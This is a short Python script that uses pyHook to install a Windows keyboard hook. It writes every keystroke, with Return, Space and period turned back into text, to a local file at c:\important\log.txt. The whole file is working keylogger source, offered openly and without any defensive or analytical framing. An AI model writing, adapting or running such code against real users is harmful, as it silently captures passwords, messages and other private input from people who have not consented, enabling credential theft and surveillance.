from __future__ import print_function

import pyHook, pythoncom, sys, logging, time

def OnKeyboardEvent(event):
	f = open ( 'c:\\important\\log.txt', 'a')
	keylogs = event.Key
	buffer = keylogs
	if buffer == "Return":
		f.write ("\n")
	elif buffer == "Space":
		f.write (" ")
	elif buffer == "Oem_Period":
		f.write (".")
	else:
		f.write (buffer)
	f.close ()
	return True

# create the hook mananger
hm = pyHook.HookManager()
# register two callbacks
hm.KeyDown = OnKeyboardEvent

# hook into the mouse and keyboard events
hm.HookKeyboard()

#if __name__ == '__main__':
#    import pythoncom
pythoncom.PumpMessages()
